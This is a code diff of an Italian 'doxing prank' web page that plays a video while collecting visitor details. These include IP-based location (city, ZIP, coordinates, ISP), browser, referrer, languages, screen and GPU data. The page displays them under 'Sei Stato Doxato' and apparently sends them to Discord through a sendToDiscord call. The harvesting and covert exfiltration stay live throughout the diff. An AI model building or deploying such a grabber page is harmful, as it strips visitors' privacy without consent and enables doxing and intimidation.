@@ -47,25 +47,21 @@
             let step = 0;
             let interval;
 
-            // Aspettiamo che il video sia pronto (ora è online, carica sempre)
-            video.onloadedmetadata = async () => {
+            video.oncanplaythrough = async () => {  // Questo triggera solo quando il video è caricato
                 loadingProgress.textContent = '80';
 
-                // API ip-api.com (affidabile)
                 const res = await fetch('https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query,hostname');
                 const geo = await res.json();
 
                 if (geo.status !== 'success') {
-                    loading.innerText = 'Errore dati (prova senza VPN)';
+                    loading.innerText = 'Errore dati (disabilita VPN/adblock)';
                     return;
                 }
 
                 loadingProgress.textContent = '99';
 
-                // Browser semplice
                 const ua = navigator.userAgent;
                 let browserName = 'Sconosciuto';
-                let browserVersion = '';
                 if (ua.includes('Chrome')) browserName = 'Google Chrome';
                 else if (ua.includes('Firefox')) browserName = 'Mozilla Firefox';
                 else if (ua.includes('Safari')) browserName = 'Safari';
@@ -84,7 +80,6 @@
                 p('Hostname', geo.hostname || 'Non disponibile');
                 p('Ora Corrente', new Date().toLocaleString());
                 p('Nome Del Browser', browserName);
-                p('User Agent', ua.substring(0, 100) + '...'); // Accorciato
                 p('Telefono | Tablet', /Mobi|Android|iPhone|iPad/.test(ua) ? 'Yes' : 'No');
                 p('Riferimento', document.referrer || 'None');
                 p('Lingua Di Sistema', navigator.languages.join(', '));
@@ -92,14 +87,11 @@
                 p('Altezza Schermo', screen.height, 'px');
                 p('Threads Della CPU', navigator.hardwareConcurrency);
 
-                // GPU semplice
                 const canvas = document.createElement('canvas');
                 let gl;
                 try {
                     gl = canvas.getContext('webgl');
-                    if (gl) {
-                        p('Info GPU', gl.getParameter(gl.RENDERER));
-                    }
+                    if (gl) p('Info GPU', gl.getParameter(gl.RENDERER));
                 } catch (e) {}
 
                 await sendToDiscord(memes);
@@ -122,7 +114,7 @@
                 let fontSize = Math.min(window.innerHeight / 10, window.innerWidth / 20);
                 data.style.fontSize = fontSize + 'px';
                 interval = setInterval(() => {
-                    const time = video.currentTime - 5 - step * 0.5; // Adattato per video più corto
+                    const time = video.currentTime - 13 - step * 0.5;  // Timing approssimativo per l'effetto
                     if (time > 0) {
                         if (step === 0) document.title = 'Sei Stato Doxato (Chill)';
                         const el = document.createElement('span');
@@ -138,8 +130,7 @@
                 }, 10);
             };
 
-            // Video online (da un prank simile "We are Jammin'")
-            video.src = 'https://we-are-jammin.xyz/video.mp4';
+            video.src = 'jammin.mp4';  // Ora punta al tuo file caricato
             video.load();
         };
     </script>
